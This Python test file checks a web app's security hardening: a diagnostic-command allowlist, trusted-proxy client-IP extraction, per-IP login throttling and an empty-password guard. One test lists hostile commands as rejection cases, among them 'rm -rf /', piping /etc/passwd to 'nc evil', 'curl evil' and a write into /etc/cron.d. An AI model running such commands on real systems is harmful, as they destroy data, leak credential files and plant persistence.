"""
Phase 0 security hardening tests (Spec 026).

Covers:
1. _client_ip: real-IP extraction from headers (CF-Connecting-IP, X-Forwarded-For, req.remote).
2. Per-real-IP rate-limit isolation: attacker IP blocked does not block operator IP.
3. Successful login does NOT consume failure budget (counter reset on success).
4. Empty-password startup guard: raises RuntimeError; does NOT sys.exit inside the helper.
"""
import sys
from pathlib import Path
from unittest.mock import MagicMock

import pytest

ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(ROOT))

import webapp as _webapp
from webapp import _client_ip, _login_attempts, _derive_token, _validate_diag_cmd


# ─────────────────────────── _validate_diag_cmd (R1) ───────────────────────────


@pytest.mark.parametrize("cmd", [
    "",  # unset
    "journalctl -u claude-ops-bot",
    "docker logs myapp",
    "tail -f /var/log/app.log",
    "head -n 50 /tmp/x.log",
    "venv/bin/python -m pytest -q",
    "/usr/bin/tail -n 100 /tmp/x",
])
def test_validate_diag_cmd_accepts_safe(cmd):
    assert _validate_diag_cmd(cmd) is True


@pytest.mark.parametrize("cmd", [
    "rm -rf /",                       # tool not allowed
    "journalctl -u x; rm -rf /",      # command chaining
    "cat /etc/passwd | nc evil 1234", # pipe
    "echo $(whoami)",                 # command substitution
    "tail -f x && curl evil",         # &&
    "tail -f x > /etc/cron.d/y",      # redirect
    "sudo journalctl -u x",           # sudo not allowed
])
def test_validate_diag_cmd_rejects_dangerous(cmd):
    assert _validate_diag_cmd(cmd) is False


# ─────────────────────────── _client_ip ───────────────────────────


def _mock_req(cf_ip=None, xff=None, remote=None):
    """Build a minimal mock request object."""
    req = MagicMock()
    headers = {}
    if cf_ip is not None:
        headers["CF-Connecting-IP"] = cf_ip
    if xff is not None:
        headers["X-Forwarded-For"] = xff
    req.headers = headers
    req.remote = remote
    return req


def test_client_ip_prefers_cf_connecting_ip(monkeypatch):
    """CF-Connecting-IP wins — but only when the peer is a trusted proxy."""
    monkeypatch.setenv("TRUSTED_PROXIES", "9.10.11.12")
    req = _mock_req(cf_ip="1.2.3.4", xff="5.6.7.8", remote="9.10.11.12")
    assert _client_ip(req) == "1.2.3.4"


def test_client_ip_falls_back_to_xff(monkeypatch):
    """Without CF-Connecting-IP, use first X-Forwarded-For entry (trusted peer)."""
    monkeypatch.setenv("TRUSTED_PROXIES", "127.0.0.1")
    req = _mock_req(xff="10.0.0.1, 10.0.0.2", remote="127.0.0.1")
    assert _client_ip(req) == "10.0.0.1"


def test_client_ip_strips_xff_whitespace(monkeypatch):
    """X-Forwarded-For entry is stripped of surrounding whitespace (trusted peer)."""
    monkeypatch.setenv("TRUSTED_PROXIES", "127.0.0.0/8")
    req = _mock_req(xff="  203.0.113.5 , 10.0.0.1", remote="127.0.0.1")
    assert _client_ip(req) == "203.0.113.5"


def test_client_ip_ignores_spoofed_headers_from_untrusted_peer(monkeypatch):
    """An untrusted peer cannot spoof CF/XFF — the socket peer is used."""
    monkeypatch.delenv("TRUSTED_PROXIES", raising=False)
    req = _mock_req(cf_ip="1.2.3.4", xff="5.6.7.8", remote="203.0.113.99")
    assert _client_ip(req) == "203.0.113.99"


def test_client_ip_falls_back_to_remote(monkeypatch):
    """Without CF or XFF headers, fall back to req.remote."""
    monkeypatch.delenv("TRUSTED_PROXIES", raising=False)
    req = _mock_req(remote="192.168.1.50")
    assert _client_ip(req) == "192.168.1.50"


def test_client_ip_unknown_when_all_missing(monkeypatch):
    """If all sources are empty/None, return 'unknown'."""
    monkeypatch.delenv("TRUSTED_PROXIES", raising=False)
    req = _mock_req(remote=None)
    assert _client_ip(req) == "unknown"


# ─────────────────────────── fixtures for HTTP tests ───────────────────────────


@pytest.fixture(autouse=False)
def clean_attempts():
    """Clear the global attempt dict before and after each test."""
    _login_attempts.clear()
    yield
    _login_attempts.clear()


@pytest.fixture
def multi_ip_ctx(tmp_path):
    """Minimal ctx with a non-empty password."""
    password = "securepass123"
    ctx = {
        "topics": {},
        "sessions": {},
        "running": {},
        "password": password,
        "DATA": tmp_path / "data",
        "HERE": ROOT,
        "VAULT_PROJECTS": None,
        "DEFAULT_MODEL": "sonnet",
        "save_sessions": lambda: None,
        "save_topics": lambda: None,
        "run_engine": None,
        "ptb_app": None,
        "rate_limits": {},
    }
    ctx["_auth_token"] = _derive_token(password)
    (tmp_path / "data").mkdir(exist_ok=True)
    return ctx


@pytest.fixture
def multi_ip_app(multi_ip_ctx, monkeypatch):
    from aiohttp import web
    # The test client's socket peer is loopback; trust it so the per-request
    # CF-Connecting-IP header is honoured (these tests simulate distinct IPs).
    monkeypatch.setenv("TRUSTED_PROXIES", "127.0.0.0/8,::1")
    app = web.Application(middlewares=[_webapp.auth_middleware])
    app["ctx"] = multi_ip_ctx
    app.router.add_post("/api/login", _webapp.api_login)
    return app


# ─────────────────────────── per-IP isolation ───────────────────────────


async def test_attacker_ip_block_does_not_affect_operator(aiohttp_client, multi_ip_app, multi_ip_ctx, clean_attempts):
    """Exhausting the budget for attacker IP must not block a different operator IP."""
    client = await aiohttp_client(multi_ip_app)

    attacker_ip = "203.0.113.99"
    operator_ip = "198.51.100.7"

    # Attacker hammers 5 bad passwords (spoofed via CF-Connecting-IP)
    for i in range(5):
        resp = await client.post(
            "/api/login",
            json={"password": f"wrong{i}"},
            headers={"CF-Connecting-IP": attacker_ip},
        )
        assert resp.status == 401, f"attempt {i+1} should be 401"

    # Attacker's 6th attempt is blocked
    resp = await client.post(
        "/api/login",
        json={"password": "stillwrong"},
        headers={"CF-Connecting-IP": attacker_ip},
    )
    assert resp.status == 429, "attacker should be throttled"
    assert "Retry-After" in resp.headers, "429 must include Retry-After header"

    # Operator from a different real IP is NOT blocked
    resp = await client.post(
        "/api/login",
        json={"password": "securepass123"},
        headers={"CF-Connecting-IP": operator_ip},
    )
    assert resp.status == 200, (
        f"operator from a different IP must not be blocked by attacker's failures; got {resp.status}"
    )


async def test_retry_after_header_present_on_429(aiohttp_client, multi_ip_app, clean_attempts):
    """429 responses carry a Retry-After header."""
    client = await aiohttp_client(multi_ip_app)
    ip = "10.0.0.88"

    for i in range(5):
        await client.post("/api/login", json={"password": "bad"}, headers={"CF-Connecting-IP": ip})

    resp = await client.post("/api/login", json={"password": "bad"}, headers={"CF-Connecting-IP": ip})
    assert resp.status == 429
    assert "Retry-After" in resp.headers
    retry_after = int(resp.headers["Retry-After"])
    assert retry_after > 0


# ─────────────────────────── success resets budget ───────────────────────────


async def test_success_resets_failure_budget(aiohttp_client, multi_ip_app, multi_ip_ctx, clean_attempts):
    """A successful login clears the failure counter, so subsequent failures restart from zero."""
    client = await aiohttp_client(multi_ip_app)
    ip = "172.16.0.5"

    # 4 bad attempts (just under the threshold)
    for i in range(4):
        resp = await client.post(
            "/api/login",
            json={"password": f"bad{i}"},
            headers={"CF-Connecting-IP": ip},
        )
        assert resp.status == 401

    # Correct password — should succeed AND reset the counter
    resp = await client.post(
        "/api/login",
        json={"password": multi_ip_ctx["password"]},
        headers={"CF-Connecting-IP": ip},
    )
    assert resp.status == 200, "correct password must succeed"

    # Now 5 more bad attempts should each give 401, not 429, because counter was reset
    for i in range(5):
        resp = await client.post(
            "/api/login",
            json={"password": f"afterreset{i}"},
            headers={"CF-Connecting-IP": ip},
        )
        # The first 5 should be 401 (not 429)
        if i < 4:
            assert resp.status == 401, (
                f"attempt {i+1} after reset should be 401, got {resp.status}"
            )


async def test_success_does_not_consume_failure_budget(aiohttp_client, multi_ip_app, multi_ip_ctx, clean_attempts):
    """Successful logins are not counted as failures — fail budget is purely failure-only."""
    client = await aiohttp_client(multi_ip_app)
    ip = "192.0.2.1"

    # Multiple successful logins
    for _ in range(6):
        resp = await client.post(
            "/api/login",
            json={"password": multi_ip_ctx["password"]},
            headers={"CF-Connecting-IP": ip},
        )
        assert resp.status == 200

    # Should still be able to make 5 bad attempts without hitting 429
    for i in range(4):
        resp = await client.post(
            "/api/login",
            json={"password": f"wrong{i}"},
            headers={"CF-Connecting-IP": ip},
        )
        assert resp.status == 401, (
            f"bad attempt {i+1} should be 401, not 429 — successes must not fill failure budget"
        )


# ─────────────────────────── empty-password startup guard ───────────────────────────


def test_empty_password_guard_raises():
    """_check_web_password raises RuntimeError for empty string."""
    from bot import _check_web_password
    with pytest.raises(RuntimeError, match="WEB_PASSWORD"):
        _check_web_password("")


def test_none_password_guard_raises():
    """_check_web_password raises RuntimeError for None (falsy)."""
    from bot import _check_web_password
    with pytest.raises(RuntimeError, match="WEB_PASSWORD"):
        _check_web_password(None)


def test_nonempty_password_guard_passes():
    """_check_web_password does NOT raise for a non-empty password."""
    from bot import _check_web_password
    _check_web_password("some-secure-passphrase")  # must not raise


def test_nonempty_password_guard_does_not_sys_exit(monkeypatch):
    """The guard function never calls sys.exit — that is the caller's responsibility."""
    from bot import _check_web_password
    calls = []
    monkeypatch.setattr(sys, "exit", lambda code=0: calls.append(code))
    # Empty password raises RuntimeError, not sys.exit
    with pytest.raises(RuntimeError):
        _check_web_password("")
    assert calls == [], "sys.exit must not be called inside _check_web_password"
